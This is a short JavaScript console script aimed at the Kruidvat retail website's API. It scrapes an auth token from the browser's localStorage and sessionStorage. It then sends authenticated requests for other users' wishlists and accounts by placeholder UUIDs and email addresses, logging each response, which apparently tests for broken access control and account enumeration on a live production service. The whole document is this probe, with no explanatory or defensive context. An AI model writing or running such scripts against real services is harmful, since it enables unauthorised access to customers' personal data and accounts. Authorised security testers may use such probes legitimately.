const B='https://api.kruidvat.nl';
let tok=null;
for(const s of [localStorage,sessionStorage])for(let i=0;i<s.length;i++){const k=s.key(i);const v=s.getItem(k);if(k.includes('auth')||/token/i.test(k)){const m=v.match(/[A-Za-z0-9_-]{20,}/);if(m)tok=m[0];}}
const H={'Authorization':'bearer '+tok,'Accept':'application/json'};
const paths=[
 '/api/v2/kvn-spa/wishlist/00000000-0000-0000-0000-000000000000',
 '/api/v2/kvn-spa/wishlist/11111111-1111-1111-1111-111111111111',
 '/api/v2/kvn-spa/users/00000000-0000-0000-0000-000000000000',
 '/api/v2/kvn-spa/users/test@example.com',
 
 '/api/v2/kvn-spa/users/nonexistent_xyz_123@example.com'
];
(async()=>{for(const p of paths){try{const r=await fetch(B+p,{headers:H,credentials:'include'});const t=await r.text();console.log(r.status,p,'|',t.slice(0,220).replace(/\n/g,' '));}catch(e){console.log('ERR',p,e.message)}await new Promise(s=>setTimeout(s,300));}})();
console.log('DONE');
